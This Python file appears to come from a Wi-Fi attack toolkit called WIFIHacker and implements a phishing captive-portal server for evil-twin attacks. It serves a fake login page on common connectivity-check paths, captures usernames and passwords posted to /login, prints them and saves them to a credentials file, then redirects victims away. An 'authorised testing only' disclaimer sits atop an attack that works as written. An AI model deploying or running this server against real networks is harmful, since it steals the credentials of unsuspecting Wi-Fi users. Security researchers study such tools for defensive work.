#!/usr/bin/env python

"""
WIFIHacker - Wireless Penetration Testing Tool
----------------------------------------------

Author      : Karthikeyan (https://karthithehacker.com)
GitHub      : https://github.com/karthi-the-hacker
Project     : WIFIHacker - A tool for WiFi auditing, penetration testing, and security assessments.

License     : Open-source for educational and ethical hacking purposes ONLY.

Note to Users:
--------------
🔐 This tool is meant strictly for educational, research, and authorized security testing.
🚫 Unauthorized use of this tool on networks you don’t own or have permission to test is illegal.
❗ If you use or modify this code, GIVE PROPER CREDIT to the original author.

Warning to Code Thieves:
------------------------
❌ Removing this header or claiming this project as your own without credit is unethical and against the open-source community principles.
🧠 Writing your own code earns respect. Copy-pasting without attribution does not.
✅ Be an ethical hacker. Respect developers' hard work and give credit where it's due.

"""

import http.server
import socketserver
from urllib.parse import parse_qs
from rich.console import Console
from rich.panel import Panel
import os
import sys
import json

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(ROOT_DIR)

from includes import banner
from includes import const
from includes import utils

console = Console()
PORT = const.port()

CRED_FILE = const.credfile()


class QuietHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  

class CaptivePortalHandler(QuietHandler):
    def do_GET(self):
        redirect_paths = const.paths()
        if self.path in redirect_paths:
            self.path = "/index.html"
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        if self.path == "/login":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = parse_qs(post_data.decode('utf-8'))
            entry =  utils.post_data(data,self)
            banner.credentials(entry)
            try:
                if os.path.exists(os.getcwd()+CRED_FILE) and os.path.getsize(os.getcwd()+CRED_FILE) > 0:
                    with open(os.getcwd()+CRED_FILE, "r") as f:
                        all_data = json.load(f)
                else:
                    all_data = []
            except json.JSONDecodeError:
                all_data = []

            all_data.append(entry)

            try:
                utils.savecred(all_data,CRED_FILE)
            except Exception as e:
                print(f"[ERROR] Could not save credentials: {e}")


            self.send_response(302)
            self.send_header('Location', 'http://example.com')
            self.end_headers()

        elif self.path == "/chat":
            # Graceful response for Samsung captive detection POST
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK")

        else:
            self.send_error(404)

def run_server(template_path):
    os.chdir(template_path)
    handler = CaptivePortalHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        print(f"[+] Captive portal running at http://0.0.0.0:{PORT}")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[!] Shutting down the server gracefully...")
            httpd.server_close()
            sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 captiveportal.py <template_path>")
        sys.exit(1)
    inf = sys.argv[2]
    wifiname = sys.argv[3]
    attack_mode = "Wifi Phishing"
    banner.show_banner()
    banner.wifiphish(inf,attack_mode,wifiname)
    run_server(sys.argv[1])
